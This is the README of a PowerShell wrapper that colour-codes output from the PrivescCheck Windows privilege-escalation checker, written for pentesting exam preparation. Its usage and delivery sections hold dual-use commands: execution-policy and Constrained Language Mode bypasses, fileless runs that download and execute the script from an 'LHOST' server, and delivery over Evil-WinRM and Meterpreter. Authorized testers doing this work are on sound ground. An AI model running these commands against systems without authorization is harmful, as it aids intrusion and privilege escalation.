# PrivescCheck-Color

A color output wrapper for [PrivescCheck](https://github.com/itm4n/PrivescCheck) by [@itm4n](https://github.com/itm4n).

Intercepts PrivescCheck's terminal output functions and replaces them with ANSI severity-colored rendering. All detection logic is unmodified. The wrapper introduces no new enumeration capability.

---

## Background

PrivescCheck assigns a severity level (`High`, `Medium`, `Low`, `Info`, `None`) to every check result but outputs everything in plain text. During a time-pressured engagement — or in a WinRM session with a narrow terminal — identifying actionable findings in a long plain-text scroll is slow.

This wrapper replaces the two output functions (`Write-CheckBanner`, `Write-CheckResult`) after the original script loads, substituting color-coded rendering without touching any detection code. The approach is a function-level override in the global scope rather than a source patch, so it remains compatible with future PrivescCheck releases without modification.

---

## Severity Color Mapping

```
[HIGH]    Red       Immediate privilege escalation vector
[MED]     Yellow    Exploitable misconfiguration
[LOW]     Cyan      Low-confidence or informational finding
[PASS]    Green     Check completed, no issue found
keyword   Magenta   Sensitive string highlighted inline (privileges, credentials, paths)
```

---

## Usage

### Basic run
```powershell
powershell -ep bypass -c ". .\Invoke-PrivescCheckColor.ps1; Invoke-PrivescCheckColor"
```

### Extended checks
```powershell
powershell -ep bypass -c ". .\Invoke-PrivescCheckColor.ps1; Invoke-PrivescCheckColor -Extended"
```

### Filter output to High and Medium only
```powershell
powershell -ep bypass -c ". .\Invoke-PrivescCheckColor.ps1; Invoke-PrivescCheckColor -Extended -SeverityFilter Medium"
```

### Extended checks with HTML report written to disk
```powershell
powershell -ep bypass -c ". .\Invoke-PrivescCheckColor.ps1; Invoke-PrivescCheckColor -Extended -Report out -Format HTML"
```

### In-memory execution, no files written to disk
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kowalski-analysis/PrivescCheck-Color/main/Invoke-PrivescCheckColor.ps1'); Invoke-PrivescCheckColor -Extended -SeverityFilter Medium
```

### Use a local copy of PrivescCheck.ps1 instead of downloading
```powershell
powershell -ep bypass -c ". .\Invoke-PrivescCheckColor.ps1; Invoke-PrivescCheckColor -SourceScript C:\tools\PrivescCheck.ps1"
```

---

## Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Extended` | Switch | Enable extended checks |
| `-Audit` | Switch | Enable audit checks |
| `-Experimental` | Switch | Enable experimental checks |
| `-Risky` | Switch | Enable checks that may trigger endpoint protection |
| `-Force` | Switch | Run when executing as administrator |
| `-Report` | String | Write results to a report file with this prefix |
| `-Format` | String | Report format: `TXT`, `HTML`, `CSV`, `XML` |
| `-SeverityFilter` | String | Suppress results below this level: `High`, `Medium`, `Low`, `Info`, `None` |
| `-NoColor` | Switch | Disable ANSI escape sequences |
| `-NoLogo` | Switch | Suppress the header block |
| `-SourceScript` | String | Path or URL to a specific `PrivescCheck.ps1` |

---

## Delivery

### WinRM / Evil-WinRM
```powershell
upload Invoke-PrivescCheckColor.ps1
. .\Invoke-PrivescCheckColor.ps1
Invoke-PrivescCheckColor -Extended -SeverityFilter Medium
```

### Meterpreter
Set a session timeout before running — default 15s is insufficient:
```
msf6 > sessions -t 300 -i 1
meterpreter > load powershell
meterpreter > powershell_import /local/path/Invoke-PrivescCheckColor.ps1
meterpreter > powershell_execute "Invoke-PrivescCheckColor -Extended -SeverityFilter Medium"
```

### Constrained Language Mode
```powershell
Get-Content .\Invoke-PrivescCheckColor.ps1 | Out-String | Invoke-Expression
```

### From an HTTP server
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-PrivescCheckColor.ps1'); Invoke-PrivescCheckColor -SeverityFilter High
```

---

## How It Works

PrivescCheck calls `Write-CheckBanner` and `Write-CheckResult` for every completed check. After loading the original script, this wrapper overrides both functions in the global PowerShell scope. The new implementations:

1. Read the `.Severity` property already set by PrivescCheck's detection logic
2. Map it to an ANSI color code
3. Scan property values for a fixed list of sensitive strings (privilege names, credential keywords, writable system paths) and highlight matches in a distinct color
4. Apply the `-SeverityFilter` threshold to suppress low-value output during triage
5. Collect all results and print a summary with per-severity counts and a named list of High/Medium findings at the end

The detection functions, severity assignments, check registry, and all enumeration logic are untouched.

---

## Sensitive String Highlighting

The following classes of strings are highlighted in result output when matched:

- **Exploitable privileges**: `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeTcbPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`
- **Misconfiguration indicators**: `AlwaysInstallElevated`, `Unquoted`, `AutoRun`, `Autologon`, `DefaultPassword`
- **Credential keywords**: `password`, `cleartext`, `plaintext`, `NTLM`, `SAM`, `LSA`, `credential`, `token`
- **High-value identities**: `NT AUTHORITY\SYSTEM`, `BUILTIN\Administrators`, `Everyone`
- **Sensitive paths**: `C:\Windows\System32`, `C:\Windows\SysWOW64`, `C:\Program Files\`

---

## Compatibility

| Environment | Status |
|---|---|
| PowerShell 2.0+ | Supported (PSv2 compatibility maintained for CLM bypass) |
| PowerShell 5.1 | Supported |
| PowerShell 7.x | Supported |
| WinRM / Evil-WinRM | Supported |
| Meterpreter powershell extension | Supported (set session timeout) |
| ANSI-capable terminal (Windows Terminal, most Linux PTYs) | Full color output |
| Legacy cmd.exe console on older Windows | Automatic fallback to plain text |

---

## Repository Structure

```
PrivescCheck-Color/
├── Invoke-PrivescCheckColor.ps1   Main script
├── README.md
├── CHANGELOG.md
├── LICENSE
└── .gitignore
```

---

## Disclaimer

This tool is for authorized penetration testing and security research only. Do not use against systems without explicit written authorization. The author accepts no liability for misuse.

---

## Credits

All vulnerability detection, enumeration logic, severity classification, and the PrivescCheck framework are the work of **Thomas Lacroix ([@itm4n](https://github.com/itm4n))**.

| | |
|---|---|
| Original project | https://github.com/itm4n/PrivescCheck |
| Original license | BSD 3-Clause |

This wrapper was written by [kowalski-analysis](https://github.com/kowalski-analysis) for pentesting certification exam preparations and authorized engagement use. If you find it useful, consider starring the original PrivescCheck repository.

---

## License

BSD 3-Clause. See [LICENSE](LICENSE). Inherited from the original PrivescCheck project.
